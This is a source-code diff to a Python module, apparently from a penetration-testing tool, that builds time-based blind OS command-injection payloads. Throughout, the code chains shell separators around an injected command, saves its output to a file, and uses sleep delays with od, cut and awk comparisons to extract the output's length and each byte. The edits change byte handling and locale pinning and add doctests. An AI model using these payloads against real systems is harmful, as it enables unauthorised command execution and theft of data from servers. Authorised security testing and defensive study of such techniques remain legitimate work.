@@ -55,6 +55,13 @@ def flattened_trimmed_text(OUTPUT_TEXTFILE):
   Each rule holds a single statement, so the program needs no ';' of its own, and the join is
   written as 'OFS' rather than a literal space - which a script rewriting whitespace would
   otherwise rewrite inside awk's own quotes, where it is text rather than a separator.
+
+  >>> ";" in flattened_trimmed_text("/tmp/o.txt")
+  False
+  >>> "|" in flattened_trimmed_text("/tmp/o.txt")
+  False
+  >>> flattened_trimmed_text("/tmp/o.txt").endswith("/tmp/o.txt")
+  True
   """
   return ("awk 'NR>1{out=(out)(OFS)}{out=(out)($0)}END{print(out)}' " + OUTPUT_TEXTFILE)
 
@@ -90,7 +97,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1})))"
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       # The write leaves no output of its own, so the read right after it reads as one word -
       # which sequences the two without an operator between them.
       payload = separator + tb_payloads._timed_comparison(timesec, j,
@@ -152,7 +159,7 @@ def decision_alter_interpreter(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + tb_payloads._py_timed_comparison(timesec, j,
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX +
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE + "') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX)
@@ -215,6 +222,8 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     if separator in (";", "\n", "\r\n") :
       arith_operator = "<=" if operator == "-le" else "=="
       payload = (separator +
+                # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
+                settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
                 "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
@@ -222,10 +231,10 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 settings.RANDOM_VAR_GENERATOR + "1=${#" + settings.RANDOM_VAR_GENERATOR + "}" + separator +
                 "sleep $((" + str(timesec) + "*(" + str(j) + arith_operator + settings.RANDOM_VAR_GENERATOR + "1)))" + separator +
                 # Transform to ASCII
-                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       arith_operator = "<=" if operator == "-le" else "=="
       # Every step is a substitution inside the one command, and they are expanded left to right:
       # the command runs, the file is flattened back over itself, the length is read off it, and
@@ -234,13 +243,15 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       measured = (settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                   settings.CMD_SUB_PREFIX + "echo \"" + settings.CMD_SUB_PREFIX + flattened_trimmed_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                   settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX)
-      to_decimals = (settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
+      to_decimals = (settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX +
                      settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX)
       payload = (separator +
                 tb_payloads._timed_comparison(timesec, j, tb_payloads._length_arg_expr(measured), arith_operator) +
                 to_decimals)
     elif separator == "&":
+      # The "&&" this payload already carries holds the pin too, which "&" alone would background away.
       payload = (separator +
+                settings.BYTE_LOCALE_EXPORTED + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + "&&" + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + "&&" +
                 "echo \"" + trimmed_output_text() + "\" >" + OUTPUT_TEXTFILE + "&&" +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
@@ -248,14 +259,15 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]&&" +
                 "sleep " + str(timesec) + "&&" +
                 # Transform to ASCII
-                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1 <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + "&&" +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1 >" + OUTPUT_TEXTFILE
                 )
 
     elif separator == "&&" :
       ampersand = "&"
       payload = (ampersand +
-                "sleep 0 " + separator +
+                # The command the "&&" needs on its left, pinning while it is there.
+                settings.BYTE_LOCALE_EXPORTED + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " " + flattened_file_text(OUTPUT_TEXTFILE) + settings.CMD_SUB_SUFFIX + separator +
                 "echo \"" + trimmed_output_text() + "\"" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
@@ -264,7 +276,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
                 "[ " + str(j) + " " + operator + " ${" + settings.RANDOM_VAR_GENERATOR + "1} ]" + separator +
                 "sleep " + str(timesec) + separator +
                 # Transform to ASCII
-                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t d1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + "od -A n -t u1<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "1" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE
                 )
 
@@ -306,7 +318,7 @@ def cmd_execution_alter_interpreter(separator, cmd, j, OUTPUT_TEXTFILE, timesec,
                 settings.RANDOM_VAR_GENERATOR + "1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep($((" + str(timesec) + "*(" + str(j) + "==${" + settings.RANDOM_VAR_GENERATOR + "1}))))\"" + settings.CMD_SUB_SUFFIX
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + tb_payloads._py_timed_comparison(timesec, j,
                   tb_payloads._py_write_expr(cmd, OUTPUT_TEXTFILE) +
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE + "') as file: print(len(file.readline()))\"" + settings.CMD_SUB_SUFFIX)
@@ -359,6 +371,8 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
   payload = ""
   win_operator = "GEQ" if operator == "-le" else "EQU"
   inverted_operator = "-gt" if operator == "-le" else "-ne"
+  # Read by every branch that scales a delay by the comparison, not only the first one to need it.
+  arith_operator = "<=" if operator == "-le" else "=="
   if settings.TARGET_OS == settings.OS.WINDOWS:
     chain = checks.windows_separator(separator)
     if chain is not None:
@@ -369,13 +383,12 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
                                      win_operator, ascii_char, timesec)
   else:
     if separator in (";", "\n", "\r\n") :
-      arith_operator = "<=" if operator == "-le" else "=="
       payload = (separator +
                 # Use space as delimiter
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "sleep $((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + settings.RANDOM_VAR_GENERATOR + ")))"
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + tb_payloads._timed_comparison(timesec, ascii_char,
                   settings.CMD_SUB_PREFIX + "awk '{print$" + str(num_of_chars) + "}' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX, arith_operator)
     elif separator == "&&" :
@@ -396,7 +409,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
     elif separator in ("|", "||"):
       pipe = "|"
       payload = (pipe +
-                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + " $(printf '%d' \"'$(cut -c" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")\") ]" + "||" +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + inverted_operator + " " + checks.byte_ordinal("$(cut -b" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")") + " ]" + "||" +
                 "sleep " + str(timesec)
                 )
     else:
@@ -426,7 +439,7 @@ def get_char_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_c
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(ord(file.readlines()[0][" + str(num_of_chars - 1) + "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + arith_operator + "${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + tb_payloads._py_timed_comparison(timesec, ascii_char,
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\"" + settings.CMD_SUB_SUFFIX, arith_operator)
     elif separator == "&&" :
@@ -472,7 +485,7 @@ def fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE +"') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
                 settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\rtime.sleep($((" + str(timesec) + "*(" + str(ascii_char) + "==${" + settings.RANDOM_VAR_GENERATOR + "}))))\"" + settings.CMD_SUB_SUFFIX
                 )
-    elif separator in ("&", "&&") and not settings.USE_BACKTICKS:
+    elif separator in ("&", "&&") and checks.substitution_nests():
       payload = separator + tb_payloads._py_timed_comparison(timesec, ascii_char,
                   settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"with open('" + OUTPUT_TEXTFILE + "') as file: print(file.readlines()[0][" + str(num_of_chars - 1) + "])\nexit(0)\"" + settings.CMD_SUB_SUFFIX)
     elif separator == "&&" :
@@ -576,7 +589,8 @@ def oracle_get_length(separator, OUTPUT_TEXTFILE, candidate_length, operator="-g
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return bb_payloads.get_length(separator, "type " + OUTPUT_TEXTFILE, candidate_length, operator)
   var = settings.RANDOM_VAR_GENERATOR
-  payload = (separator +
+  # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
+  payload = (separator + settings.BYTE_LOCALE_EXPORTED + separator +
             var + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
             bb_payloads._decide(separator, "${#" + var + "}" + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + str(candidate_length))
             )
@@ -593,7 +607,7 @@ def oracle_get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, operat
     return ""
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return bb_payloads.get_char(separator, "type " + OUTPUT_TEXTFILE, num_of_chars, ascii_char, operator)
-  ordinal = "$(printf '%d' \"'$(cut -c" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")\")"
+  ordinal = checks.byte_ordinal("$(cut -b" + str(num_of_chars) + " " + OUTPUT_TEXTFILE + ")")
   payload = separator + bb_payloads._decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal)
   return checks.terminate_payload(payload, separator)
 
